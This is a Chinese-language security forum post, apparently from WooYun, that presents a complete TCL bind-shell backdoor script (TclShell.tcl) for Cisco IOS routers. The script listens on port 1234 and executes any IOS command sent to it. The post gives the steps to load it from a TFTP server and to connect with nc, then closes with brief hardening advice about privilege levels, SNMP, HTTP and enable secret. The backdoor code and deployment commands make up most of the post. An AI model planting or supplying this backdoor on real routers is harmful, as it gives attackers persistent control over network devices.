# 给CISCO设备中后门的方法--TCL 以及路由安全

之前在 zone 里边有人讨论过CISCO 的后门问题我就说了个利用TCL cisco 的一个脚本处理技术详见[http://www.cisco.com/en/US/docs/ios/12_3t/12_3t2/feature/guide/gt_tcl.html](http://www.cisco.com/en/US/docs/ios/12_3t/12_3t2/feature/guide/gt_tcl.html)现在给整理出来。郑重声明本人仅讨论方法与该技术如利用此技术给他人造成的经济损失与本人无关。 首先给出脚本此脚本非本人所写国外已经有大牛写出来了

```
# TclShell.tcl v0.1 by Andy Davis, IRM 2007

#

# IRM accepts no responsibility for the misuse of this code

# It is provided for demonstration purposes only

proc callback {sock addr port} {  
fconfigure $sock -translation lf -buffering line  
puts $sock " "  
puts $sock "---|---|---|---|---|---|---|---|---|---|---|---|-"  
puts $sock "TclShell v0.1 by Andy Davis, IRM 2007"  
puts $sock "---|---|---|---|---|---|---|---|---|---|---|---|-"  
puts $sock " "  
set response [exec "sh ver | inc IOS"]  
puts $sock $response  
set response [exec "sh priv"]  
puts $sock $response  
puts $sock " "  
puts $sock "Enter IOS command:"  
fileevent $sock readable [list echo $sock]  
}  
proc echo {sock} {  
global var  
if {[eof $sock] || [catch {gets $sock line}]} {  
} else {  
set response [exec "$line"]  
puts $sock $response  
}  
}  
set port 1234  
set sh [socket -server callback $port]  
vwait var  
close $sh

```在CISCO设备上运行如下命令需要有tftp```
Router#tclsh

Router(tcl)#source tftp://1.1.1.2/backdoor.tcl

```设备会变成假死状态因此不建议在console下运行基本上也不可能，在其他机器上```
nc 路由器IP 1234

```

附截图一张

![20130129153731_80467.jpg](http://static.wooyun.org/20131018/2013101807230255315.jpg)  

防御办法其实这个功能本来是方便给网络攻城狮批量配置和测试使用的。因此需要LV 15的权限因此只要LV15的权限还在就没有太大问题。其实CISCO 设备的菊花还是不太好爆的除了有0day 基本上都是因为人为的配置不当产生的，常见的比如配置了可写的但是很SB的SNMP，开放了一些不怎么使用或者有危险的服务.比如未授权的http 而且不用认证就可以跑配置出来或者使用了enable password 而不是 enable secret 设置密码，要不就是使用了弱密码，如果这些如果杜绝了基本上菊花差不多就可以保住了